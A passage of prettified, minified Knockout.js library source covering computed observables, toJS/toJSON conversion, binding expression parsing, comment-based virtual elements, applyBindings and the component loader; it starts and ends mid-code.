            return this[r].V;
          },
          Va: function () {
            var b = [];
            a.a.P(this[r].I, function (a, d) {
              b[d.Ka] = d.da;
            });
            return b;
          },
          Vb: function (b) {
            if (!this[r].V) return !1;
            var c = this.Va();
            return -1 !== a.a.A(c, b) ? !0 : !!a.a.Lb(c, function (a) {
              return a.Vb && a.Vb(b);
            });
          },
          uc: function (a, c, d) {
            if (this[r].wb && c === this) throw Error("A 'pure' computed must not be called recursively");
            this[r].I[a] = d;
            d.Ka = this[r].V++;
            d.La = c.ob();
          },
          Xa: function () {
            var a,
              c,
              d = this[r].I;
            for (a in d) if (Object.prototype.hasOwnProperty.call(d, a) && (c = d[a], this.Ia && c.da.Ja || c.da.Dd(c.La))) return !0;
          },
          Jd: function () {
            this.Ia && !this[r].rb && this.Ia(!1);
          },
          ja: function () {
            var a = this[r];
            return a.ka || 0 < a.V;
          },
          Rd: function () {
            this.Ja ? this[r].ka && (this[r].sa = !0) : this.Hc();
          },
          $c: function (a) {
            if (a.Hb) {
              var c = a.subscribe(this.Jd, this, "dirty"),
                d = a.subscribe(this.Rd, this);
              return {
                da: a,
                s: function () {
                  c.s();
                  d.s();
                }
              };
            }
            return a.subscribe(this.Hc, this);
          },
          Hc: function () {
            var b = this,
              c = b.throttleEvaluation;
            c && 0 <= c ? (clearTimeout(this[r].Ic), this[r].Ic = a.a.setTimeout(function () {
              b.ha(!0);
            }, c)) : b.Ia ? b.Ia(!0) : b.ha(!0);
          },
          ha: function (b) {
            var c = this[r],
              d = c.Sa,
              e = !1;
            if (!c.rb && !c.ra) {
              if (c.l && !a.a.Sb(c.l) || d && d()) {
                if (!c.jc) {
                  this.s();
                  return;
                }
              } else c.jc = !1;
              c.rb = !0;
              try {
                e = this.zd(b);
              } finally {
                c.rb = !1;
              }
              return e;
            }
          },
          zd: function (b) {
            var c = this[r],
              d = !1,
              e = c.wb ? n : !c.V,
              d = {
                qd: this,
                mb: c.I,
                Qb: c.V
              };
            a.u.xc({
              pd: d,
              od: ba,
              o: this,
              Ya: e
            });
            c.I = {};
            c.V = 0;
            var f = this.yd(c, d);
            c.V ? d = this.sb(c.X, f) : (this.s(), d = !0);
            d && (c.J ? this.Gb() : this.notifySubscribers(c.X, "beforeChange"), c.X = f, this.notifySubscribers(c.X, "spectate"), !c.J && b && this.notifySubscribers(c.X), this.rc && this.rc());
            e && this.notifySubscribers(c.X, "awake");
            return d;
          },
          yd: function (b, c) {
            try {
              var d = b.Wc;
              return b.nb ? d.call(b.nb) : d();
            } finally {
              a.u.end(), c.Qb && !b.J && a.a.P(c.mb, aa), b.sa = b.ka = !1;
            }
          },
          v: function (a) {
            var c = this[r];
            (c.ka && (a || !c.V) || c.J && this.Xa()) && this.ha();
            return c.X;
          },
          ub: function (b) {
            a.T.fn.ub.call(this, b);
            this.nc = function () {
              this[r].J || (this[r].sa ? this.ha() : this[r].ka = !1);
              return this[r].X;
            };
            this.Ia = function (a) {
              this.pc(this[r].X);
              this[r].ka = !0;
              a && (this[r].sa = !0);
              this.qc(this, !a);
            };
          },
          s: function () {
            var b = this[r];
            !b.J && b.I && a.a.P(b.I, function (a, b) {
              b.s && b.s();
            });
            b.l && b.Rb && a.a.K.yb(b.l, b.Rb);
            b.I = n;
            b.V = 0;
            b.ra = !0;
            b.sa = !1;
            b.ka = !1;
            b.J = !1;
            b.l = n;
            b.Sa = n;
            b.Wc = n;
            this.Nc || (b.nb = n);
          }
        },
        da = {
          Qa: function (b) {
            var c = this,
              d = c[r];
            if (!d.ra && d.J && "change" == b) {
              d.J = !1;
              if (d.sa || c.Xa()) d.I = null, d.V = 0, c.ha() && c.Gb();else {
                var e = [];
                a.a.P(d.I, function (a, b) {
                  e[b.Ka] = a;
                });
                a.a.D(e, function (a, b) {
                  var e = d.I[a],
                    m = c.$c(e.da);
                  m.Ka = b;
                  m.La = e.La;
                  d.I[a] = m;
                });
                c.Xa() && c.ha() && c.Gb();
              }
              d.ra || c.notifySubscribers(d.X, "awake");
            }
          },
          hb: function (b) {
            var c = this[r];
            c.ra || "change" != b || this.Wa("change") || (a.a.P(c.I, function (a, b) {
              b.s && (c.I[a] = {
                da: b.da,
                Ka: b.Ka,
                La: b.La
              }, b.s());
            }), c.J = !0, this.notifySubscribers(n, "asleep"));
          },
          ob: function () {
            var b = this[r];
            b.J && (b.sa || this.Xa()) && this.ha();
            return a.T.fn.ob.call(this);
          }
        },
        ea = {
          Qa: function (a) {
            "change" != a && "beforeChange" != a || this.v();
          }
        };
      a.a.Ba && a.a.setPrototypeOf(C, a.T.fn);
      var N = a.ta.Ma;
      C[N] = a.o;
      a.Oc = function (a) {
        return "function" == typeof a && a[N] === C[N];
      };
      a.Fd = function (b) {
        return a.Oc(b) && b[r] && b[r].wb;
      };
      a.b("computed", a.o);
      a.b("dependentObservable", a.o);
      a.b("isComputed", a.Oc);
      a.b("isPureComputed", a.Fd);
      a.b("computed.fn", C);
      a.L(C, "peek", C.v);
      a.L(C, "dispose", C.s);
      a.L(C, "isActive", C.ja);
      a.L(C, "getDependenciesCount", C.qa);
      a.L(C, "getDependencies", C.Va);
      a.xb = function (b, c) {
        if ("function" === typeof b) return a.o(b, c, {
          pure: !0
        });
        b = a.a.extend({}, b);
        b.pure = !0;
        return a.o(b, c);
      };
      a.b("pureComputed", a.xb);
      (function () {
        function b(a, f, g) {
          g = g || new d();
          a = f(a);
          if ("object" != typeof a || null === a || a === n || a instanceof RegExp || a instanceof Date || a instanceof String || a instanceof Number || a instanceof Boolean) return a;
          var h = a instanceof Array ? [] : {};
          g.save(a, h);
          c(a, function (c) {
            var d = f(a[c]);
            switch (typeof d) {
              case "boolean":
              case "number":
              case "string":
              case "function":
                h[c] = d;
                break;
              case "object":
              case "undefined":
                var l = g.get(d);
                h[c] = l !== n ? l : b(d, f, g);
            }
          });
          return h;
        }
        function c(a, b) {
          if (a instanceof Array) {
            for (var c = 0; c < a.length; c++) b(c);
            "function" == typeof a.toJSON && b("toJSON");
          } else for (c in a) b(c);
        }
        function d() {
          this.keys = [];
          this.values = [];
        }
        a.ad = function (c) {
          if (0 == arguments.length) throw Error("When calling ko.toJS, pass the object you want to convert.");
          return b(c, function (b) {
            for (var c = 0; a.O(b) && 10 > c; c++) b = b();
            return b;
          });
        };
        a.toJSON = function (b, c, d) {
          b = a.ad(b);
          return a.a.hc(b, c, d);
        };
        d.prototype = {
          constructor: d,
          save: function (b, c) {
            var d = a.a.A(this.keys, b);
            0 <= d ? this.values[d] = c : (this.keys.push(b), this.values.push(c));
          },
          get: function (b) {
            b = a.a.A(this.keys, b);
            return 0 <= b ? this.values[b] : n;
          }
        };
      })();
      a.b("toJS", a.ad);
      a.b("toJSON", a.toJSON);
      a.Wd = function (b, c, d) {
        function e(c) {
          var e = a.xb(b, d).extend({
              ma: "always"
            }),
            h = e.subscribe(function (a) {
              a && (h.s(), c(a));
            });
          e.notifySubscribers(e.v());
          return h;
        }
        return "function" !== typeof Promise || c ? e(c.bind(d)) : new Promise(e);
      };
      a.b("when", a.Wd);
      (function () {
        a.w = {
          M: function (b) {
            switch (a.a.R(b)) {
              case "option":
                return !0 === b.__ko__hasDomDataOptionValue__ ? a.a.g.get(b, a.c.options.$b) : 7 >= a.a.W ? b.getAttributeNode("value") && b.getAttributeNode("value").specified ? b.value : b.text : b.value;
              case "select":
                return 0 <= b.selectedIndex ? a.w.M(b.options[b.selectedIndex]) : n;
              default:
                return b.value;
            }
          },
          cb: function (b, c, d) {
            switch (a.a.R(b)) {
              case "option":
                "string" === typeof c ? (a.a.g.set(b, a.c.options.$b, n), "__ko__hasDomDataOptionValue__" in b && delete b.__ko__hasDomDataOptionValue__, b.value = c) : (a.a.g.set(b, a.c.options.$b, c), b.__ko__hasDomDataOptionValue__ = !0, b.value = "number" === typeof c ? c : "");
                break;
              case "select":
                if ("" === c || null === c) c = n;
                for (var e = -1, f = 0, g = b.options.length, h; f < g; ++f) if (h = a.w.M(b.options[f]), h == c || "" === h && c === n) {
                  e = f;
                  break;
                }
                if (d || 0 <= e || c === n && 1 < b.size) b.selectedIndex = e, 6 === a.a.W && a.a.setTimeout(function () {
                  b.selectedIndex = e;
                }, 0);
                break;
              default:
                if (null === c || c === n) c = "";
                b.value = c;
            }
          }
        };
      })();
      a.b("selectExtensions", a.w);
      a.b("selectExtensions.readValue", a.w.M);
      a.b("selectExtensions.writeValue", a.w.cb);
      a.m = function () {
        function b(b) {
          b = a.a.Db(b);
          123 === b.charCodeAt(0) && (b = b.slice(1, -1));
          b += "\n,";
          var c = [],
            d = b.match(e),
            p,
            q = [],
            h = 0;
          if (1 < d.length) {
            for (var x = 0, B; B = d[x]; ++x) {
              var u = B.charCodeAt(0);
              if (44 === u) {
                if (0 >= h) {
                  c.push(p && q.length ? {
                    key: p,
                    value: q.join("")
                  } : {
                    unknown: p || q.join("")
                  });
                  p = h = 0;
                  q = [];
                  continue;
                }
              } else if (58 === u) {
                if (!h && !p && 1 === q.length) {
                  p = q.pop();
                  continue;
                }
              } else if (47 === u && 1 < B.length && (47 === B.charCodeAt(1) || 42 === B.charCodeAt(1))) continue;else 47 === u && x && 1 < B.length ? (u = d[x - 1].match(f)) && !g[u[0]] && (b = b.substr(b.indexOf(B) + 1), d = b.match(e), x = -1, B = "/") : 40 === u || 123 === u || 91 === u ? ++h : 41 === u || 125 === u || 93 === u ? --h : p || q.length || 34 !== u && 39 !== u || (B = B.slice(1, -1));
              q.push(B);
            }
            if (0 < h) throw Error("Unbalanced parentheses, braces, or brackets");
          }
          return c;
        }
        var c = ["true", "false", "null", "undefined"],
          d = /^(?:[$_a-z][$\w]*|(.+)(\.\s*[$_a-z][$\w]*|\[.+\]))$/i,
          e = RegExp("\"(?:\\\\.|[^\"])*\"|'(?:\\\\.|[^'])*'|`(?:\\\\.|[^`])*`|/\\*(?:[^*]|\\*+[^*/])*\\*+/|//.*\n|/(?:\\\\.|[^/])+/w*|[^\\s:,/][^,\"'`{}()/:[\\]]*[^\\s,\"'`{}()/:[\\]]|[^\\s]", "g"),
          f = /[\])"'A-Za-z0-9_$]+$/,
          g = {
            "in": 1,
            "return": 1,
            "typeof": 1
          },
          h = {};
        return {
          Ra: [],
          wa: h,
          ac: b,
          vb: function (e, f) {
            function l(b, e) {
              var f;
              if (!x) {
                var k = a.getBindingHandler(b);
                if (k && k.preprocess && !(e = k.preprocess(e, b, l))) return;
                if (k = h[b]) f = e, 0 <= a.a.A(c, f) ? f = !1 : (k = f.match(d), f = null === k ? !1 : k[1] ? "Object(" + k[1] + ")" + k[2] : f), k = f;
                k && q.push("'" + ("string" == typeof h[b] ? h[b] : b) + "':function(_z){" + f + "=_z}");
              }
              g && (e = "function(){return " + e + " }");
              p.push("'" + b + "':" + e);
            }
            f = f || {};
            var p = [],
              q = [],
              g = f.valueAccessors,
              x = f.bindingParams,
              B = "string" === typeof e ? b(e) : e;
            a.a.D(B, function (a) {
              l(a.key || a.unknown, a.value);
            });
            q.length && l("_ko_property_writers", "{" + q.join(",") + " }");
            return p.join(",");
          },
          Id: function (a, b) {
            for (var c = 0; c < a.length; c++) if (a[c].key == b) return !0;
            return !1;
          },
          eb: function (b, c, d, e, f) {
            if (b && a.O(b)) !a.Za(b) || f && b.v() === e || b(e);else if ((b = c.get("_ko_property_writers")) && b[d]) b[d](e);
          }
        };
      }();
      a.b("expressionRewriting", a.m);
      a.b("expressionRewriting.bindingRewriteValidators", a.m.Ra);
      a.b("expressionRewriting.parseObjectLiteral", a.m.ac);
      a.b("expressionRewriting.preProcessBindings", a.m.vb);
      a.b("expressionRewriting._twoWayBindings", a.m.wa);
      a.b("jsonExpressionRewriting", a.m);
      a.b("jsonExpressionRewriting.insertPropertyAccessorsIntoJson", a.m.vb);
      (function () {
        function b(a) {
          return 8 == a.nodeType && g.test(f ? a.text : a.nodeValue);
        }
        function c(a) {
          return 8 == a.nodeType && h.test(f ? a.text : a.nodeValue);
        }
        function d(d, e) {
          for (var f = d, h = 1, g = []; f = f.nextSibling;) {
            if (c(f) && (a.a.g.set(f, k, !0), h--, 0 === h)) return g;
            g.push(f);
            b(f) && h++;
          }
          if (!e) throw Error("Cannot find closing comment tag to match: " + d.nodeValue);
          return null;
        }
        function e(a, b) {
          var c = d(a, b);
          return c ? 0 < c.length ? c[c.length - 1].nextSibling : a.nextSibling : null;
        }
        var f = w && "\x3c!--test--\x3e" === w.createComment("test").text,
          g = f ? /^\x3c!--\s*ko(?:\s+([\s\S]+))?\s*--\x3e$/ : /^\s*ko(?:\s+([\s\S]+))?\s*$/,
          h = f ? /^\x3c!--\s*\/ko\s*--\x3e$/ : /^\s*\/ko\s*$/,
          m = {
            ul: !0,
            ol: !0
          },
          k = "__ko_matchedEndComment__";
        a.h = {
          ea: {},
          childNodes: function (a) {
            return b(a) ? d(a) : a.childNodes;
          },
          Ea: function (c) {
            if (b(c)) {
              c = a.h.childNodes(c);
              for (var d = 0, e = c.length; d < e; d++) a.removeNode(c[d]);
            } else a.a.Tb(c);
          },
          va: function (c, d) {
            if (b(c)) {
              a.h.Ea(c);
              for (var e = c.nextSibling, f = 0, k = d.length; f < k; f++) e.parentNode.insertBefore(d[f], e);
            } else a.a.va(c, d);
          },
          Vc: function (a, c) {
            var d;
            b(a) ? (d = a.nextSibling, a = a.parentNode) : d = a.firstChild;
            d ? c !== d && a.insertBefore(c, d) : a.appendChild(c);
          },
          Wb: function (c, d, e) {
            e ? (e = e.nextSibling, b(c) && (c = c.parentNode), e ? d !== e && c.insertBefore(d, e) : c.appendChild(d)) : a.h.Vc(c, d);
          },
          firstChild: function (a) {
            if (b(a)) return !a.nextSibling || c(a.nextSibling) ? null : a.nextSibling;
            if (a.firstChild && c(a.firstChild)) throw Error("Found invalid end comment, as the first child of " + a);
            return a.firstChild;
          },
          nextSibling: function (d) {
            b(d) && (d = e(d));
            if (d.nextSibling && c(d.nextSibling)) {
              var f = d.nextSibling;
              if (c(f) && !a.a.g.get(f, k)) throw Error("Found end comment without a matching opening comment, as child of " + d);
              return null;
            }
            return d.nextSibling;
          },
          Cd: b,
          Vd: function (a) {
            return (a = (f ? a.text : a.nodeValue).match(g)) ? a[1] : null;
          },
          Sc: function (d) {
            if (m[a.a.R(d)]) {
              var f = d.firstChild;
              if (f) {
                do if (1 === f.nodeType) {
                  var k;
                  k = f.firstChild;
                  var h = null;
                  if (k) {
                    do if (h) h.push(k);else if (b(k)) {
                      var g = e(k, !0);
                      g ? k = g : h = [k];
                    } else c(k) && (h = [k]); while (k = k.nextSibling);
                  }
                  if (k = h) for (h = f.nextSibling, g = 0; g < k.length; g++) h ? d.insertBefore(k[g], h) : d.appendChild(k[g]);
                } while (f = f.nextSibling);
              }
            }
          }
        };
      })();
      a.b("virtualElements", a.h);
      a.b("virtualElements.allowedBindings", a.h.ea);
      a.b("virtualElements.emptyNode", a.h.Ea);
      a.b("virtualElements.insertAfter", a.h.Wb);
      a.b("virtualElements.prepend", a.h.Vc);
      a.b("virtualElements.setDomNodeChildren", a.h.va);
      (function () {
        a.ga = function () {
          this.nd = {};
        };
        a.a.extend(a.ga.prototype, {
          nodeHasBindings: function (b) {
            switch (b.nodeType) {
              case 1:
                return null != b.getAttribute("data-bind") || a.j.getComponentNameForNode(b);
              case 8:
                return a.h.Cd(b);
              default:
                return !1;
            }
          },
          getBindings: function (b, c) {
            var d = this.getBindingsString(b, c),
              d = d ? this.parseBindingsString(d, c, b) : null;
            return a.j.tc(d, b, c, !1);
          },
          getBindingAccessors: function (b, c) {
            var d = this.getBindingsString(b, c),
              d = d ? this.parseBindingsString(d, c, b, {
                valueAccessors: !0
              }) : null;
            return a.j.tc(d, b, c, !0);
          },
          getBindingsString: function (b) {
            switch (b.nodeType) {
              case 1:
                return b.getAttribute("data-bind");
              case 8:
                return a.h.Vd(b);
              default:
                return null;
            }
          },
          parseBindingsString: function (b, c, d, e) {
            try {
              var f = this.nd,
                g = b + (e && e.valueAccessors || ""),
                h;
              if (!(h = f[g])) {
                var m,
                  k = "with($context){with($data||{}){return{" + a.m.vb(b, e) + "}}}";
                m = new Function("$context", "$element", k);
                h = f[g] = m;
              }
              return h(c, d);
            } catch (l) {
              throw l.message = "Unable to parse bindings.\nBindings value: " + b + "\nMessage: " + l.message, l;
            }
          }
        });
        a.ga.instance = new a.ga();
      })();
      a.b("bindingProvider", a.ga);
      (function () {
        function b(b) {
          var c = (b = a.a.g.get(b, z)) && b.N;
          c && (b.N = null, c.Tc());
        }
        function c(c, d, e) {
          this.node = c;
          this.yc = d;
          this.kb = [];
          this.H = !1;
          d.N || a.a.K.za(c, b);
          e && e.N && (e.N.kb.push(c), this.Kb = e);
        }
        function d(a) {
          return function () {
            return a;
          };
        }
        function e(a) {
          return a();
        }
        function f(b) {
          return a.a.Ga(a.u.G(b), function (a, c) {
            return function () {
              return b()[c];
            };
          });
        }
        function g(b, c, e) {
          return "function" === typeof b ? f(b.bind(null, c, e)) : a.a.Ga(b, d);
        }
        function h(a, b) {
          return f(this.getBindings.bind(this, a, b));
        }
        function m(b, c) {
          var d = a.h.firstChild(c);
          if (d) {
            var e,
              f = a.ga.instance,
              l = f.preprocessNode;
            if (l) {
              for (; e = d;) d = a.h.nextSibling(e), l.call(f, e);
              d = a.h.firstChild(c);
            }
            for (; e = d;) d = a.h.nextSibling(e), k(b, e);
          }
          a.i.ma(c, a.i.H);
        }
        function k(b, c) {
          var d = b,
            e = 1 === c.nodeType;
          e && a.h.Sc(c);
          if (e || a.ga.instance.nodeHasBindings(c)) d = p(c, null, b).bindingContextForDescendants;
          d && !u[a.a.R(c)] && m(d, c);
        }
        function l(b) {
          var c = [],
            d = {},
            e = [];
          a.a.P(b, function ca(f) {
            if (!d[f]) {
              var k = a.getBindingHandler(f);
              k && (k.after && (e.push(f), a.a.D(k.after, function (c) {
                if (b[c]) {
                  if (-1 !== a.a.A(e, c)) throw Error("Cannot combine the following bindings, because they have a cyclic dependency: " + e.join(", "));
                  ca(c);
                }
              }), e.length--), c.push({
                key: f,
                Mc: k
              }));
              d[f] = !0;
            }
          });
          return c;
        }
        function p(b, c, d) {
          var f = a.a.g.Ub(b, z, {}),
            k = f.hd;
          if (!c) {
            if (k) throw Error("You cannot apply bindings multiple times to the same element.");
            f.hd = !0;
          }
          k || (f.context = d);
          f.Zb || (f.Zb = {});
          var g;
          if (c && "function" !== typeof c) g = c;else {
            var p = a.ga.instance,
              q = p.getBindingAccessors || h,
              m = a.$(function () {
                if (g = c ? c(d, b) : q.call(p, b, d)) {
                  if (d[t]) d[t]();
                  if (d[B]) d[B]();
                }
                return g;
              }, null, {
                l: b
              });
            g && m.ja() || (m = null);
          }
          var x = d,
            u;
          if (g) {
            var J = function () {
                return a.a.Ga(m ? m() : g, e);
              },
              r = m ? function (a) {
                return function () {
                  return e(m()[a]);
                };
              } : function (a) {
                return g[a];
              };
            J.get = function (a) {
              return g[a] && e(r(a));
            };
            J.has = function (a) {
              return a in g;
            };
            a.i.H in g && a.i.subscribe(b, a.i.H, function () {
              var c = (0, g[a.i.H])();
              if (c) {
                var d = a.h.childNodes(b);
                d.length && c(d, a.Ec(d[0]));
              }
            });
            a.i.pa in g && (x = a.i.Cb(b, d), a.i.subscribe(b, a.i.pa, function () {
              var c = (0, g[a.i.pa])();
              c && a.h.firstChild(b) && c(b);
            }));
            f = l(g);
            a.a.D(f, function (c) {
              var d = c.Mc.init,
                e = c.Mc.update,
                f = c.key;
              if (8 === b.nodeType && !a.h.ea[f]) throw Error("The binding '" + f + "' cannot be used with virtual elements");
              try {
                "function" == typeof d && a.u.G(function () {
                  var a = d(b, r(f), J, x.$data, x);
                  if (a && a.controlsDescendantBindings) {
                    if (u !== n) throw Error("Multiple bindings (" + u + " and " + f + ") are trying to control descendant bindings of the same element. You cannot use these bindings together on the same element.");
                    u = f;
                  }
                }), "function" == typeof e && a.$(function () {
                  e(b, r(f), J, x.$data, x);
                }, null, {
                  l: b
                });
              } catch (k) {
                throw k.message = 'Unable to process binding "' + f + ": " + g[f] + '"\nMessage: ' + k.message, k;
              }
            });
          }
          f = u === n;
          return {
            shouldBindDescendants: f,
            bindingContextForDescendants: f && x
          };
        }
        function q(b, c) {
          return b && b instanceof a.fa ? b : new a.fa(b, n, n, c);
        }
        var t = a.a.Da("_subscribable"),
          x = a.a.Da("_ancestorBindingInfo"),
          B = a.a.Da("_dataDependency");
        a.c = {};
        var u = {
          script: !0,
          textarea: !0,
          template: !0
        };
        a.getBindingHandler = function (b) {
          return a.c[b];
        };
        var J = {};
        a.fa = function (b, c, d, e, f) {
          function k() {
            var b = p ? h() : h,
              f = a.a.f(b);
            c ? (a.a.extend(l, c), x in c && (l[x] = c[x])) : (l.$parents = [], l.$root = f, l.ko = a);
            l[t] = q;
            g ? f = l.$data : (l.$rawData = b, l.$data = f);
            d && (l[d] = f);
            e && e(l, c, f);
            if (c && c[t] && !a.S.o().Vb(c[t])) c[t]();
            m && (l[B] = m);
            return l.$data;
          }
          var l = this,
            g = b === J,
            h = g ? n : b,
            p = "function" == typeof h && !a.O(h),
            q,
            m = f && f.dataDependency;
          f && f.exportDependencies ? k() : (q = a.xb(k), q.v(), q.ja() ? q.equalityComparer = null : l[t] = n);
        };
        a.fa.prototype.createChildContext = function (b, c, d, e) {
          !e && c && "object" == typeof c && (e = c, c = e.as, d = e.extend);
          if (c && e && e.noChildContext) {
            var f = "function" == typeof b && !a.O(b);
            return new a.fa(J, this, null, function (a) {
              d && d(a);
              a[c] = f ? b() : b;
            }, e);
          }
          return new a.fa(b, this, c, function (a, b) {
            a.$parentContext = b;
            a.$parent = b.$data;
            a.$parents = (b.$parents || []).slice(0);
            a.$parents.unshift(a.$parent);
            d && d(a);
          }, e);
        };
        a.fa.prototype.extend = function (b, c) {
          return new a.fa(J, this, null, function (c) {
            a.a.extend(c, "function" == typeof b ? b(c) : b);
          }, c);
        };
        var z = a.a.g.Z();
        c.prototype.Tc = function () {
          this.Kb && this.Kb.N && this.Kb.N.sd(this.node);
        };
        c.prototype.sd = function (b) {
          a.a.Pa(this.kb, b);
          !this.kb.length && this.H && this.Cc();
        };
        c.prototype.Cc = function () {
          this.H = !0;
          this.yc.N && !this.kb.length && (this.yc.N = null, a.a.K.yb(this.node, b), a.i.ma(this.node, a.i.pa), this.Tc());
        };
        a.i = {
          H: "childrenComplete",
          pa: "descendantsComplete",
          subscribe: function (b, c, d, e, f) {
            var k = a.a.g.Ub(b, z, {});
            k.Fa || (k.Fa = new a.T());
            f && f.notifyImmediately && k.Zb[c] && a.u.G(d, e, [b]);
            return k.Fa.subscribe(d, e, c);
          },
          ma: function (b, c) {
            var d = a.a.g.get(b, z);
            if (d && (d.Zb[c] = !0, d.Fa && d.Fa.notifySubscribers(b, c), c == a.i.H)) if (d.N) d.N.Cc();else if (d.N === n && d.Fa && d.Fa.Wa(a.i.pa)) throw Error("descendantsComplete event not supported for bindings on this node");
          },
          Cb: function (b, d) {
            var e = a.a.g.Ub(b, z, {});
            e.N || (e.N = new c(b, e, d[x]));
            return d[x] == e ? d : d.extend(function (a) {
              a[x] = e;
            });
          }
        };
        a.Td = function (b) {
          return (b = a.a.g.get(b, z)) && b.context;
        };
        a.ib = function (b, c, d) {
          1 === b.nodeType && a.h.Sc(b);
          return p(b, c, q(d));
        };
        a.ld = function (b, c, d) {
          d = q(d);
          return a.ib(b, g(c, d, b), d);
        };
        a.Oa = function (a, b) {
          1 !== b.nodeType && 8 !== b.nodeType || m(q(a), b);
        };
        a.vc = function (a, b, c) {
          !v && A.jQuery && (v = A.jQuery);
          if (2 > arguments.length) {
            if (b = w.body, !b) throw Error("ko.applyBindings: could not find document.body; has the document been loaded?");
          } else if (!b || 1 !== b.nodeType && 8 !== b.nodeType) throw Error("ko.applyBindings: first parameter should be your view model; second parameter should be a DOM node");
          k(q(a, c), b);
        };
        a.Dc = function (b) {
          return !b || 1 !== b.nodeType && 8 !== b.nodeType ? n : a.Td(b);
        };
        a.Ec = function (b) {
          return (b = a.Dc(b)) ? b.$data : n;
        };
        a.b("bindingHandlers", a.c);
        a.b("bindingEvent", a.i);
        a.b("bindingEvent.subscribe", a.i.subscribe);
        a.b("bindingEvent.startPossiblyAsyncContentBinding", a.i.Cb);
        a.b("applyBindings", a.vc);
        a.b("applyBindingsToDescendants", a.Oa);
        a.b("applyBindingAccessorsToNode", a.ib);
        a.b("applyBindingsToNode", a.ld);
        a.b("contextFor", a.Dc);
        a.b("dataFor", a.Ec);
      })();
      (function (b) {
        function c(c, e) {
          var k = Object.prototype.hasOwnProperty.call(f, c) ? f[c] : b,
            l;
          k ? k.subscribe(e) : (k = f[c] = new a.T(), k.subscribe(e), d(c, function (b, d) {
            var e = !(!d || !d.synchronous);
            g[c] = {
              definition: b,
              Gd: e
            };
            delete f[c];
            l || e ? k.notifySubscribers(b) : a.na.zb(function () {
              k.notifySubscribers(b);
            });
          }), l = !0);
        }
        function d(a, b) {
          e("getConfig", [a], function (c) {
            c ? e("loadComponent", [a, c], function (a) {
              b(a, c);
            }) : b(null, null);
          });
        }
        function e(c, d, f, l) {
          l || (l = a.j.loaders.slice(0));
          var g = l.shift();
          if (g) {
            var q = g[c];
            if (q) {
              var t = !1;
              if (q.apply(g, d.concat(function (a) {
                t ? f(null) : null !== a ? f(a) : e(c, d, f, l);
              })) !== b && (t = !0, !g.suppressLoaderExceptions)) throw Error("Component loaders must supply values by invoking the callback, not by returning values synchronously.");
            } else e(c, d, f, l);
          } else f(null);
        }
        var f = {},
          g = {};
        a.j = {
          get: function (d, e) {
            var f = Object.prototype.hasOwnProperty.call(g, d) ? g[d] : b;
            f ? f.Gd ? a.u.G(function () {
              e(f.definition);
            }) : a.na.zb(function () {
              e(f.definition);
            }) : c(d, e);
          },
          Bc: function (a) {
            delete g[a];
          },
          oc: e
        };
        a.j.loaders = [];
        a.b("components", a.j);
        a.b("components.get", a.j.get);
        a.b("components.clearCachedDefinition", a.j.Bc);
      })();
      (function () {
        function b(b, c, d, e) {
          function g() {
            0 === --B && e(h);
          }
          var h = {},
            B = 2,
            u = d.template;
          d = d.viewModel;
          u ? f(c, u, function (c) {
            a.j.oc("loadTemplate", [b, c], function (a) {
              h.template = a;
              g();
            });
          }) : g();
          d ? f(c, d, function (c) {
            a.j.oc("loadViewModel", [b, c], function (a) {
              h[m] = a;
              g();
            });
          }) : g();
        }
        function c(a, b, d) {
          if ("function" === typeof b) d(function (a) {
            return new b(a);
          });else if ("function" === typeof b[m]) d(b[m]);else if ("instance" in b) {
            var e = b.instance;
            d(function () {
              return e;
            });
          } else "viewModel" in b ? c(a, b.viewModel, d) : a("Unknown viewModel value: " + b);
        }
        function d(b) {
          switch (a.a.R(b)) {
            case "script":
              return a.a.ua(b.text);
            case "textarea":
              return a.a.ua(b.value);
            case "template":
              if (e(b.content)) return a.a.Ca(b.content.childNodes);
          }
          return a.a.Ca(b.childNodes);
        }
        function e(a) {
          return A.DocumentFragment ? a instanceof DocumentFragment : a && 11 === a.nodeType;
        }
        function f(a, b, c) {
          "string" === typeof b.require ? T || A.require ? (T || A.require)([b.require], function (a) {
            a && "object" === typeof a && a.Xd && a["default"] && (a = a["default"]);
            c(a);
          }) : a("Uses require, but no AMD loader is present") : c(b);
        }
        function g(a) {
          return function (b) {
            throw Error("Component '" + a + "': " + b);
          };
        }
        var h = {};
        a.j.register = function (b, c) {
          if (!c) throw Error("Invalid configuration for " + b);
          if (a.j.tb(b)) throw Error("Component " + b + " is already registered");
          h[b] = c;
        };
        a.j.tb = function (a) {
          return Object.prototype.hasOwnProperty.call(h, a);
        };
        a.j.unregister = function (b) {
          delete h[b];
          a.j.Bc(b);
        };
        a.j.Fc = {
          getConfig: function (b, c) {
            c(a.j.tb(b) ? h[b] : null);
          },
          loadComponent: function (a, c, d) {
            var e = g(a);
            f(e, c, function (c) {
              b(a, e, c, d);
            });
          },
          loadTemplate: function (b, c, f) {
            b = g(b);
            if ("string" === typeof c) f(a.a.ua(c));else if (c instanceof Array) f(c);else if (e(c)) f(a.a.la(c.childNodes));else if (c.element) {
              if (c = c.element, A.HTMLElement ? c instanceof HTMLElement : c && c.tagName && 1 === c.nodeType) f(d(c));else if ("string" === typeof c) {
                var h = w.getElementById(c);
                h ? f(d(h)) : b("Cannot find element with ID " + c);
              } else b("Unknown element type: " + c);
            } else b("Unknown template value: " + c);
          },
          loadViewModel: function (a, b, d) {
            c(g(a), b, d);
          }
        };
        var m = "createViewModel";
        a.b("components.register", a.j.register);
        a.b("components.isRegistered", a.j.tb);
        a.b("components.unregister", a.j.unregister);
        a.b("components.defaultLoader", a.j.Fc);
        a.j.loaders.push(a.j.Fc);
        a.j.dd = h;
      })();
      (function () {
        function b(b, e) {
          var f = b.getAttribute("params");
          if (f) {
            var f = c.parseBindingsString(f, e, b, {
                valueAccessors: !0,
                bindingParams: !0
              }),
              f = a.a.Ga(f, function (c) {
                return a.o(c, null, {
                  l: b
                });
              }),
              g = a.a.Ga(f, function (c) {
                var e = c.v();
                return c.ja() ? a.o({
                  read: function () {
                    return a.a.f(c());
                  },
                  write: a.Za(e) && function (a) {
                    c()(a);
                  },
                  l: b
                }) : e;
              });
            Object.prototype.hasOwnProperty.call(g, "$raw") || (g.$raw = f);
            return g;
          }
          return {
            $raw: {}
          };
        }
        a.j.getComponentNameForNode = function (b) {
          var c = a.a.R(b);
          if (a.j.tb(c) && (-1 != c.indexOf("-") || "[object HTMLUnknownElement]" == "" + b || 8 >= a.a.W && b.tagName === c)) return c;
        };
        a.j.tc = function (c, e, f, g) {
          if (1 === e.nodeType) {
            var h = a.j.getComponentNameForNode(e);
            if (h) {
              c = c || {};
              if (c.component) throw Error('Cannot use the "component" binding on a custom element matching a component');
              var m = {
                name: h,
                params: b(e, f)
              };
